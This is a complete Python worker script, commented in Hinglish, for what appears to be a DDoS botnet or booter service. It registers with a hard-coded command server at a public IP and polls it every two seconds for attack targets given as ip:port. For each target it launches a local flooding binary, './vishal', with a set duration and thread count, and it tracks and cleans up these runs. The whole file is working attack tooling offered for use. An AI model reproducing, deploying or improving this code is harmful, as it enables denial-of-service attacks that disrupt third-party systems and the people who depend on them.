import requests
import subprocess
import time
import json
import os

BASE_URL = 'http://3.228.19.162:80'  # config.py ka server
API_KEY_FILE = 'api_key.txt'
WORKER_ID_FILE = 'worker_id.txt'

# Track active attacks
active_tasks = {}

def load_or_get_api_key():
    """API key load kare ya naya generate kare"""
    try:
        with open(API_KEY_FILE, 'r') as f:
            api_key = f.read().strip()
            if api_key:
                print(f"[+] Loaded API key from {API_KEY_FILE}")
                return api_key
    except FileNotFoundError:
        pass
    
    # Naya API key generate kare
    username = f"bot_{int(time.time())}"
    try:
        response = requests.get(f'{BASE_URL}/register', params={'username': username})
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                api_key = data.get('api_key')
                with open(API_KEY_FILE, 'w') as f:
                    f.write(api_key)
                print(f"[+] Generated new API key: {api_key[:15]}...")
                return api_key
    except Exception as e:
        print(f"[!] Failed to generate API key: {e}")
    
    return None

def get_worker_id():
    """Get or generate unique worker ID"""
    try:
        with open(WORKER_ID_FILE, 'r') as f:
            worker_id = f.read().strip()
            if worker_id:
                return worker_id
    except FileNotFoundError:
        pass
    
    # Generate new worker ID
    worker_id = f"worker_{int(time.time())}_{os.getpid()}"
    with open(WORKER_ID_FILE, 'w') as f:
        f.write(worker_id)
    return worker_id

def fetch_active_attacks(api_key):
    """Active attacks fetch kare server se - ALL attacks return kare"""
    try:
        headers = {'X-API-Key': api_key} if api_key else {}
        response = requests.get(f'{BASE_URL}/status', headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            # Return ALL attacks, not just "running" ones
            return data.get('attacks', [])
    except requests.exceptions.Timeout:
        print(f"[!] Timeout while fetching attacks from server")
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection error - server might be down")
    except Exception as e:
        print(f"[!] Failed to fetch attacks: {e}")
    
    return []

def process_new_attack(attack_info):
    """Naya attack process kare aur vishal binary run kare"""
    if not attack_info:
        return
    
    attack_id = attack_info.get('attack_id')
    target = attack_info.get('target', '')
    status = attack_info.get('status', '')
    
    # Debug info
    print(f"[DEBUG] Processing attack: ID={attack_id}, Target={target}, Status={status}")
    
    if not target or ':' not in target:
        print(f"[!] Invalid target format: {target}")
        return
    
    # Check if attack is already being processed
    if attack_id in active_tasks:
        print(f"[!] Attack {attack_id} is already being processed")
        return
    
    # Parse target
    try:
        ip_port = target.split(':')
        if len(ip_port) != 2:
            print(f"[!] Invalid target format: {target}")
            return
        
        ip = ip_port[0].strip()
        port = ip_port[1].strip()
        
        if not ip or not port:
            print(f"[!] Empty IP or port in target: {target}")
            return
    except Exception as e:
        print(f"[!] Error parsing target {target}: {e}")
        return
    
    print(f"[+] New attack detected: {target} (ID: {attack_id})")
    
    # Get attack details from server
    duration = 60  # default
    threads = 10   # default
    
    try:
        # Request specific attack details
        headers = {'X-API-Key': api_key} if 'api_key' in globals() else {}
        details_response = requests.get(
            f'{BASE_URL}/status', 
            params={'attack_id': attack_id},
            headers=headers,
            timeout=3
        )
        
        if details_response.status_code == 200:
            details = details_response.json()
            duration = details.get('duration', 60)
            threads = details.get('threads', 10)
            print(f"[+] Attack details: duration={duration}s, threads={threads}")
    except Exception as e:
        print(f"[!] Could not fetch attack details: {e}")
        # Use defaults if can't fetch details
    
    # Check if ./vishal binary exists
    if not os.path.exists('./vishal'):
        print(f"[!] ERROR: ./vishal binary not found!")
        print(f"[!] Make sure ./vishal exists in current directory")
        print(f"[!] Run: chmod +x vishal")
        print(f"[!] Waiting 10 seconds...")
        time.sleep(10)
        return
    
    # Run ./vishal binary
    try:
        # ./vishal ip port duration threads
        cmd = ['./vishal', ip, port, str(duration), str(threads)]
        print(f"[+] Executing: {' '.join(cmd)}")
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"[+] Successfully launched ./vishal (PID: {process.pid})")
        
        # Track this task
        active_tasks[attack_id] = {
            'process': process,
            'attack_id': attack_id,
            'ip': ip,
            'port': port,
            'duration': int(duration),
            'threads': int(threads),
            'start_time': time.time(),
            'pid': process.pid,
            'status': 'running'
        }
        
        # Start monitoring thread for this process
        def monitor_process(proc, attack_id):
            """Monitor process output"""
            stdout, stderr = proc.communicate()
            
            if attack_id in active_tasks:
                if proc.returncode == 0:
                    print(f"[+] Attack {attack_id} completed successfully")
                else:
                    print(f"[!] Attack {attack_id} failed with return code {proc.returncode}")
                    if stderr:
                        print(f"[!] Error output: {stderr[:200]}")
                
                # Clean up
                del active_tasks[attack_id]
        
        # Start monitor in background
        import threading
        monitor_thread = threading.Thread(
            target=monitor_process,
            args=(process, attack_id),
            daemon=True
        )
        monitor_thread.start()
        
    except FileNotFoundError:
        print(f"[!] CRITICAL: ./vishal binary not found!")
    except PermissionError:
        print(f"[!] CRITICAL: ./vishal is not executable!")
        print(f"[!] Run: chmod +x vishal")
    except Exception as e:
        print(f"[!] Failed to launch ./vishal: {e}")

def check_and_clean_tasks():
    """Check running tasks and clean completed ones"""
    current_time = time.time()
    tasks_to_remove = []
    
    for attack_id, task in list(active_tasks.items()):
        process = task['process']
        
        # Check if process is still running
        if process.poll() is not None:  # Process finished
            print(f"[+] Process completed for {task['ip']}:{task['port']} (PID: {process.pid})")
            tasks_to_remove.append(attack_id)
        # Check if duration has passed (with some buffer)
        elif current_time - task['start_time'] > task['duration'] + 5:
            print(f"[+] Duration expired for {task['ip']}:{task['port']}, terminating...")
            try:
                process.terminate()
                process.wait(timeout=3)
            except:
                try:
                    process.kill()
                except:
                    pass
            tasks_to_remove.append(attack_id)
        # Check if process is hanging (no output for too long)
        elif current_time - task['start_time'] > 30 and task.get('last_output_time', 0) < current_time - 30:
            print(f"[!] Process {attack_id} might be hanging, checking...")
            # Add more checks here if needed
    
    # Remove completed/expired tasks
    for attack_id in tasks_to_remove:
        if attack_id in active_tasks:
            del active_tasks[attack_id]
    
    return len(tasks_to_remove)

def register_worker(api_key, worker_id):
    """Register this worker with the server"""
    try:
        headers = {'X-API-Key': api_key}
        data = {
            'worker_id': worker_id,
            'hostname': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
            'pid': os.getpid(),
            'start_time': time.time()
        }
        
        # You might need to add this endpoint to mm.py
        response = requests.post(
            f'{BASE_URL}/register_worker',
            json=data,
            headers=headers,
            timeout=5
        )
        
        if response.status_code == 200:
            print(f"[+] Worker registered with ID: {worker_id}")
            return True
    except Exception as e:
        print(f"[!] Could not register worker: {e}")
    
    return False

def main_loop():
    """Main monitoring loop"""
    print("[+] Starting worker.py for RAJA server")
    print(f"[+] Server: {BASE_URL}")
    print("[+] Will run ./vishal binary for each active attack")
    print("[+] Checking if ./vishal exists...")
    
    # Check for vishal binary
    if not os.path.exists('./vishal'):
        print(f"[!] WARNING: ./vishal binary not found in current directory!")
        print(f"[!] Please place vishal binary here and run: chmod +x vishal")
        print(f"[!] Continuing anyway, will check again before each attack...")
    
    # Get API key
    api_key = load_or_get_api_key()
    if not api_key:
        print("[!] No API key available. Exiting.")
        return
    
    print(f"[+] Using API key: {api_key[:15]}...")
    
    # Get worker ID
    worker_id = get_worker_id()
    print(f"[+] Worker ID: {worker_id}")
    
    # Try to register worker
    # register_worker(api_key, worker_id)
    
    print("[+] Starting monitoring loop...")
    print("[+] Checking for attacks every 2 seconds")
    print("[+] Press Ctrl+C to stop")
    print("-" * 50)
    
    check_interval = 2  # seconds between checks
    last_check = 0
    check_count = 0
    
    while True:
        try:
            current_time = time.time()
            check_count += 1
            
            # Check for new attacks every X seconds
            if current_time - last_check >= check_interval:
                print(f"\n[{time.strftime('%H:%M:%S')}] Check #{check_count}")
                
                # Fetch active attacks
                attacks = fetch_active_attacks(api_key)
                
                if attacks:
                    print(f"[+] Found {len(attacks)} attack(s) from server")
                    
                    # Process each attack
                    for attack in attacks:
                        attack_id = attack.get('attack_id')
                        status = attack.get('status', '')
                        
                        # Only process if not already being processed
                        if attack_id not in active_tasks:
                            print(f"[+] New attack to process: {attack_id} (status: {status})")
                            process_new_attack(attack)
                        else:
                            # Already processing, just update status
                            if active_tasks[attack_id].get('status') != status:
                                active_tasks[attack_id]['status'] = status
                else:
                    print(f"[+] No attacks found from server")
                
                last_check = current_time
            
            # Check and clean completed tasks
            cleaned = check_and_clean_tasks()
            if cleaned > 0:
                print(f"[+] Cleaned {cleaned} completed task(s)")
            
            # Show active tasks status
            if active_tasks:
                print(f"[+] Currently running {len(active_tasks)} ./vishal process(es):")
                for attack_id, task in active_tasks.items():
                    elapsed = int(time.time() - task['start_time'])
                    remaining = max(0, task['duration'] - elapsed)
                    print(f"    - {attack_id[:8]}...: {task['ip']}:{task['port']} "
                          f"({elapsed}s/{task['duration']}s, {remaining}s remaining)")
            else:
                print(f"[+] No active tasks running")
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n\n[!] Stopping worker...")
            print("[!] Terminating all running processes...")
            
            # Kill all running processes
            for attack_id, task in active_tasks.items():
                try:
                    process = task['process']
                    print(f"[!] Terminating process for {task['ip']}:{task['port']} (PID: {process.pid})")
                    process.terminate()
                    try:
                        process.wait(timeout=2)
                    except:
                        process.kill()
                except Exception as e:
                    print(f"[!] Error terminating process: {e}")
            
            print("[!] Worker stopped.")
            break
            
        except Exception as e:
            print(f"\n[!] Error in main loop: {e}")
            print(f"[!] Will retry in 5 seconds...")
            time.sleep(5)

if __name__ == '__main__':
    main_loop()